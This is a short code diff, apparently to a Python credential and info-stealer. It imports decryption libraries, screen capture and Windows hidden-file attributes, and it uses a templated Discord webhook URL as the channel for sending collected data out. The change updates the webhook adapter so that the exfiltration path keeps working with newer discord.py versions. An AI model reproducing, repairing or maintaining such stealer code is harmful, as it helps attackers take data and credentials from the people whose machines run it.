@@ -24,7 +24,7 @@ import requests
 import wmi
 from Crypto.Cipher import AES
 from cryptography.fernet import Fernet
-from discord import Embed, File, RequestsWebhookAdapter, Webhook
+from discord import Embed, File, SyncWebhook, Webhook
 from PIL import ImageGrab
 from win32api import SetFileAttributes
 from win32con import FILE_ATTRIBUTE_HIDDEN
@@ -35,7 +35,7 @@ WEBHOOK_URL = "&WEBHOOK_URL&"
 def main(webhook_url):
 	global webhook, embed
 
-	webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
+	webhook = Webhook.from_url(webhook_url, adapter=SyncWebhook())
 	embed = Embed(title="Cortés Family", color=15535980)
 	
 	get_inf()
